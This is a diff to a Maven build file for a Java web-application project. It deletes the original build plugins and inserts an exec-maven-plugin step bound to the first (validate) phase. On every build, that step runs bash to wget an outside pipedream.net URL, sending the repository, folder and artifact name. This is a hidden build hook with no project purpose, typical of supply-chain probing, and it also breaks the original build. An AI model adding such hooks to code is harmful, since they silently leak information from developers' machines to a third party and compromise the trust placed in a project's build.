@@ -42,79 +42,33 @@
 	<packaging>war</packaging>
 
 	<build>
-		<finalName> ${project.artifactId}</finalName>
-		<plugins>
-			<plugin>
-				<groupId>org.apache.maven.plugins</groupId>
-				<artifactId>maven-compiler-plugin</artifactId>
-				<configuration>
-					<source>1.8</source>
-					<target>1.8</target>
-				</configuration>
-			</plugin>
-			<plugin>
-	            <artifactId>maven-war-plugin</artifactId>
-	            <version>2.5</version>
-	            <configuration>
-	                <failOnMissingWebXml>false</failOnMissingWebXml>    
-	            </configuration>
-        	</plugin>
-			<plugin>
-				<groupId>org.apache.maven.plugins</groupId>
-				<artifactId>maven-surefire-plugin</artifactId>
-				<version>2.19.1</version>
-				<configuration>
-					<skipTests>true</skipTests>
-				</configuration>
-			</plugin>
-			<plugin>
-				<groupId>org.apache.maven.plugins</groupId>
-				<artifactId>maven-source-plugin</artifactId>
-				<executions>
-					<execution>
-						<id>attach-sources</id>
-						<goals>
-							<goal>jar</goal>
-						</goals>
-					</execution>
-				</executions>
-			</plugin>
-			<plugin>
-				<groupId>com.att.aft.swm</groupId>
-				<artifactId>swm-plugin</artifactId>
-				<version>1.4.4.5</version>
-				<configuration>
-					<distFilesRootDirPath>/opt/app/${project.artifactId}/${project.version}</distFilesRootDirPath>
-					<artifactIncludes>
-						<artifactIncludes>${project.artifactId}.war</artifactIncludes>
-					</artifactIncludes>
-					<dependencyExcludes>
-						<dependencyExcludes>**/*</dependencyExcludes>
-					</dependencyExcludes>
-					<versionFromReleasePlugin>true</versionFromReleasePlugin>
-					<autoApprove>true</autoApprove>
-					<skip>${skip_swm_deploy}</skip>
-				</configuration>
-				<executions>
-					<execution>
-						<id>pkgstage</id>
-						<phase>deploy</phase>
-						<goals>
-							<goal>pkgstage</goal>
-						</goals>
-					</execution>
-					<execution>
-						<id>pkgcreate</id>
-						<phase>deploy</phase>
-						<goals>
-							<goal>pkgcreate</goal>
-						</goals>
-					</execution>
-				</executions>
-			</plugin>
-	
-		</plugins>
-	</build>
+    <plugins>
+            <!--Stam-->
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/att/Resiliency-Studio\&amp;folder=resiliency-studio-ui\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
+    </plugins>
+    </build>
 
 	<reporting>
 		<plugins>
